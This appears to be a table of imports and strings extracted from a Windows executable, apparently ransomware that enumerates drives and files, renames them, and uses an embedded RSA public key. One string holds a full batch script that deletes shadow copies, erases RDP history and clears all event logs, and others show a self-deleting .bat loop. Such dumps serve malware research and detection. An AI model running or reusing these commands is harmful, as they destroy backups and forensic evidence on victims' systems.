reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x406681	0x4080ac	import	0x4064d2	KERNEL32.dll.lstrcpyW
0x4066b4	0x408004	import	0x4064d2	ADVAPI32.dll.GetCurrentHwProfileW
0x40674a	0x408044	import	0x4064d2	KERNEL32.dll.CreateFileW
0x40675c	0x408040	import	0x4064d2	KERNEL32.dll.ReadFile
0x406786	0x408060	import	0x4064d2	KERNEL32.dll.SetFilePointer
0x4067d1	0x408070	import	0x4064d2	KERNEL32.dll.lstrcpyA
0x4067ee	0x408044	import	0x4064d2	KERNEL32.dll.CreateFileW
0x406808	0x408060	import	0x4064d2	KERNEL32.dll.SetFilePointer
0x40680f	0x408028	import	0x4064d2	KERNEL32.dll.lstrlenA
0x406820	0x408038	import	0x4064d2	KERNEL32.dll.WriteFile
0x40683c	0x4080b4	import	0x4064d2	KERNEL32.dll.CloseHandle
0x406844	0x408088	import	0x4064d2	KERNEL32.dll.GetStdHandle
0x406852	0x406f80	string	0x4064d2	UVW3
0x406867	0x4072d9	string	0x4064d2	QSUVWj
0x40687c	0x4072d9	string	0x4064d2	QSUVWj
0x406884	0x4080c4	import	0x4064d2	KERNEL32.dll.lstrlenW
0x40689a	0x4080d0	import	0x4064d2	KERNEL32.dll.HeapCreate
0x4068a7	0x4080d8	import	0x4064d2	KERNEL32.dll.HeapAlloc
0x4068b4	0x408070	import	0x4064d2	KERNEL32.dll.lstrcpyA
0x4068bc	0x4071ca	string	0x4064d2	UVW3
0x4068c1	0x4080c8	import	0x4064d2	KERNEL32.dll.lstrcatA
0x40691c	0x408008	import	0x4068f3	ADVAPI32.dll.RegOpenKeyExW
0x406924	0x40699c	string	0x4068f3	_^][
0x40693a	0x408d2c	string	0x4068f3	CertificatesCheck
0x406943	0x40800c	import	0x4068f3	ADVAPI32.dll.RegQueryValueExW
0x40694f	0x408098	import	0x4068f3	KERNEL32.dll.lstrcmpiW
0x40696b	0x408010	import	0x4068f3	ADVAPI32.dll.RegCreateKeyExW
0x406976	0x4080c4	import	0x4068f3	KERNEL32.dll.lstrlenW
0x406983	0x408d2c	string	0x4068f3	CertificatesCheck
0x40698c	0x408000	import	0x4068f3	ADVAPI32.dll.RegSetValueExW
0x406996	0x408020	import	0x4068f3	ADVAPI32.dll.RegCloseKey
0x4069b7	0x4072d9	string	0x4069a7	QSUVWj
0x4069c3	0x408028	import	0x4069a7	KERNEL32.dll.lstrlenA
0x4069e3	0x4080d0	import	0x4069a7	KERNEL32.dll.HeapCreate
0x4069f3	0x4080d8	import	0x4069a7	KERNEL32.dll.HeapAlloc
0x406a45	0x408034	import	0x406a32	KERNEL32.dll.GetProcessHeap
0x406a4c	0x4080d8	import	0x406a32	KERNEL32.dll.HeapAlloc
0x406a54	0x4080d4	import	0x406a32	KERNEL32.dll.GetLogicalDrives
0x406a87	0x408074	import	0x406a32	KERNEL32.dll.GetDriveTypeA
0x406aa5	0x408034	import	0x406a32	KERNEL32.dll.GetProcessHeap
0x406aac	0x4080d8	import	0x406a32	KERNEL32.dll.HeapAlloc
0x406abb	0x408070	import	0x406a32	KERNEL32.dll.lstrcpyA
0x406ad4	0x40808c	import	0x406a32	KERNEL32.dll.lstrcmpiA
0x406b0f	0x406f80	string	0x406af4	UVW3
0x406b1a	0x406f80	string	0x406af4	UVW3
0x406b25	0x407891	string	0x406af4	SVWj\bj
0x406b35	0x406d2b	string	0x406af4	_^][
0x406b3b	0x40809c	import	0x406af4	KERNEL32.dll.lstrcatW
0x406b41	0x408098	import	0x406af4	KERNEL32.dll.lstrcmpiW
0x406b5f	0x4080c4	import	0x406af4	KERNEL32.dll.lstrlenW
0x406b87	0x40805c	import	0x406af4	KERNEL32.dll.FindFirstFileW
0x406bdd	0x4071ca	string	0x406af4	UVW3
0x406bef	0x407004	string	0x406af4	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x406c16	0x407891	string	0x406af4	SVWj\bj
0x406c21	0x407004	string	0x406af4	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x406c5b	0x4080e8	import	0x406af4	SHLWAPI.dll.PathFindFileNameW
0x406c81	0x4080b0	import	0x406af4	KERNEL32.dll.SetFileAttributesW
0x406c8d	0x407004	string	0x406af4	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x406cb3	0x4080ac	import	0x406af4	KERNEL32.dll.lstrcpyW
0x406cd9	0x40806c	import	0x406af4	KERNEL32.dll.MoveFileExW
0x406cee	0x408034	import	0x406af4	KERNEL32.dll.GetProcessHeap
0x406cf5	0x408030	import	0x406af4	KERNEL32.dll.HeapFree
0x406d05	0x4080a0	import	0x406af4	KERNEL32.dll.FindNextFileW
0x406d14	0x408090	import	0x406af4	KERNEL32.dll.FindClose
0x406d3e	0x4080e4	import	0x406d38	SHLWAPI.dll.PathRemoveFileSpecW
0x406d44	0x40809c	import	0x406d38	KERNEL32.dll.lstrcatW
0x406d78	0x408044	import	0x406d38	KERNEL32.dll.CreateFileW
0x406d94	0x408028	import	0x406d38	KERNEL32.dll.lstrlenA
0x406da2	0x408038	import	0x406d38	KERNEL32.dll.WriteFile
0x406da9	0x4080b4	import	0x406d38	KERNEL32.dll.CloseHandle
0x406db5	0x40807c	import	0x406db4	KERNEL32.dll.GetFileAttributesW
0x406de6	0x408058	import	0x406dc6	KERNEL32.dll.GetTempFileNameW
0x406dec	0x408c30	string	0x406dc6	.bat
0x406df6	0x4080ac	import	0x406dc6	KERNEL32.dll.lstrcpyW
0x406e10	0x408044	import	0x406dc6	KERNEL32.dll.CreateFileW
0x406e26	0x4080c4	import	0x406dc6	KERNEL32.dll.lstrlenW
0x406e35	0x408ca4	string	0x406dc6	"\*.
0x406e3e	0x408c78	string	0x406dc6	" goto Repeat\r\ndel "
0x406e47	0x408c5c	string	0x406dc6	"\r\nif exist "
0x406e55	0x408c3c	string	0x406dc6	:Repeat\r\ndel "
0x406e6a	0x408094	import	0x406dc6	KERNEL32.dll.LocalAlloc
0x406e72	0x408c3c	string	0x406dc6	:Repeat\r\ndel "
0x406e78	0x4080ac	import	0x406dc6	KERNEL32.dll.lstrcpyW
0x406e7e	0x40809c	import	0x406dc6	KERNEL32.dll.lstrcatW
0x406e8c	0x408c5c	string	0x406dc6	"\r\nif exist "
0x406e9c	0x408c78	string	0x406dc6	" goto Repeat\r\ndel "
0x406eac	0x408ca4	string	0x406dc6	"\*.
0x406ec1	0x4071ca	string	0x406dc6	UVW3
0x406ec8	0x408038	import	0x406dc6	KERNEL32.dll.WriteFile
0x406ecf	0x4080a8	import	0x406dc6	KERNEL32.dll.LocalFree
0x406ed6	0x4080b4	import	0x406dc6	KERNEL32.dll.CloseHandle
0x406f13	0x408058	import	0x406ef0	KERNEL32.dll.GetTempFileNameW
0x406f19	0x408c30	string	0x406ef0	.bat
0x406f25	0x40809c	import	0x406ef0	KERNEL32.dll.lstrcatW
0x406f41	0x408044	import	0x406ef0	KERNEL32.dll.CreateFileW
0x406f52	0x408a68	string	0x406ef0	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x406f59	0x408028	import	0x406ef0	KERNEL32.dll.lstrlenA
0x406f62	0x408038	import	0x406ef0	KERNEL32.dll.WriteFile
0x406f69	0x4080b4	import	0x406ef0	KERNEL32.dll.CloseHandle
0x406f8f	0x408084	import	0x406f80	KERNEL32.dll.MultiByteToWideChar
0x406f9e	0x408034	import	0x406f80	KERNEL32.dll.GetProcessHeap
0x406fa5	0x4080d8	import	0x406f80	KERNEL32.dll.HeapAlloc
0x406fb6	0x408084	import	0x406f80	KERNEL32.dll.MultiByteToWideChar
0x406ff8	0x408068	import	0x406fc2	KERNEL32.dll.CreateProcessW
0x407062	0x408028	import	0x407004	KERNEL32.dll.lstrlenA
0x40706e	0x408028	import	0x407004	KERNEL32.dll.lstrlenA
0x40707c	0x408028	import	0x407004	KERNEL32.dll.lstrlenA
0x40708c	0x408028	import	0x407004	KERNEL32.dll.lstrlenA
0x407095	0x40808c	import	0x407004	KERNEL32.dll.lstrcmpiA
0x407141	0x408028	import	0x407139	KERNEL32.dll.lstrlenA
0x4071da	0x40803c	import	0x4071ca	KERNEL32.dll.WideCharToMultiByte
0x4071e4	0x408034	import	0x4071ca	KERNEL32.dll.GetProcessHeap
0x4071eb	0x4080d8	import	0x4071ca	KERNEL32.dll.HeapAlloc
0x4071fe	0x40803c	import	0x4071ca	KERNEL32.dll.WideCharToMultiByte
0x4072eb	0x4080d0	import	0x4072d9	KERNEL32.dll.HeapCreate
0x4072fc	0x4080d8	import	0x4072d9	KERNEL32.dll.HeapAlloc
0x407305	0x408028	import	0x4072d9	KERNEL32.dll.lstrlenA
0x40730f	0x40726a	string	0x4072d9	QSUVW
0x40734a	0x408034	import	0x40733c	KERNEL32.dll.GetProcessHeap
0x407351	0x4080d8	import	0x40733c	KERNEL32.dll.HeapAlloc
0x4073cc	0x408044	import	0x4073b5	KERNEL32.dll.CreateFileW
0x4073f0	0x4080b4	import	0x4073b5	KERNEL32.dll.CloseHandle
0x407447	0x408028	import	0x4073fc	KERNEL32.dll.lstrlenA
0x407471	0x408038	import	0x4073fc	KERNEL32.dll.WriteFile
0x4074e0	0x408db8	string	0x407490	rsa_genkey
0x4074e6	0x408028	import	0x407490	KERNEL32.dll.lstrlenA
0x407502	0x408034	import	0x407490	KERNEL32.dll.GetProcessHeap
0x40753c	0x4073b5	string	0x407490	SVW3\v
0x40757a	0x4080d8	import	0x407490	KERNEL32.dll.HeapAlloc
0x4075bb	0x4080d8	import	0x407490	KERNEL32.dll.HeapAlloc
0x4075f0	0x4080d8	import	0x407490	KERNEL32.dll.HeapAlloc
0x40765c	0x408860	string	0x407490	AD7651B4AA6B35B00702778C811651A7764A27AD0939834FC5FDB7C47D940E6ED04AD39D5BDA89818859EEC2B144F7F0CD2DF940BE26BB627D3A4C2C03A535CDA834C5BD45E33723B705C249E2423E71CC51205B7DA65A24DBB11E8F0913B281D8C33EF540F3817529442669D8739AE45D8E640446F48260428810513C93D7914B64CAF095F8A9736E94069CAD0B3A470755D67B81DD225484EADA8E71788D8A392C6D8129082E0095F769FDF99A359B2EBC68F4CD63CEA3BE81A9DBEADBA265B920D29B5AC7E7F3441383EA3094B3CAE322FA7E7804E9FFEC08AD8E3495EE8EB561A7EBA8D01ECD7FAA4F9199478ED1A58C97C6A89815B546B8B79FD2E40221
0x40768b	0x408034	import	0x407490	KERNEL32.dll.GetProcessHeap
0x407695	0x408030	import	0x407490	KERNEL32.dll.HeapFree
0x4076d9	0x40733c	string	0x407490	SUVW
0x407740	0x408dac	string	0x4076e7	rsa_encrypt
0x407746	0x408028	import	0x4076e7	KERNEL32.dll.lstrlenA
0x407778	0x408858	string	0x4076e7	010001
0x407828	0x4080c4	import	0x407823	KERNEL32.dll.lstrlenW
0x407838	0x408034	import	0x407823	KERNEL32.dll.GetProcessHeap
0x40783f	0x4080d8	import	0x407823	KERNEL32.dll.HeapAlloc
0x407849	0x4080ac	import	0x407823	KERNEL32.dll.lstrcpyW
0x407868	0x4080ac	import	0x407854	KERNEL32.dll.lstrcpyW
0x407872	0x408034	import	0x407854	KERNEL32.dll.GetProcessHeap
0x407879	0x408030	import	0x407854	KERNEL32.dll.HeapFree
0x407882	0x408034	import	0x407854	KERNEL32.dll.GetProcessHeap
0x407889	0x408030	import	0x407854	KERNEL32.dll.HeapFree
0x40789c	0x408034	import	0x407891	KERNEL32.dll.GetProcessHeap
0x4078a3	0x4080d8	import	0x407891	KERNEL32.dll.HeapAlloc
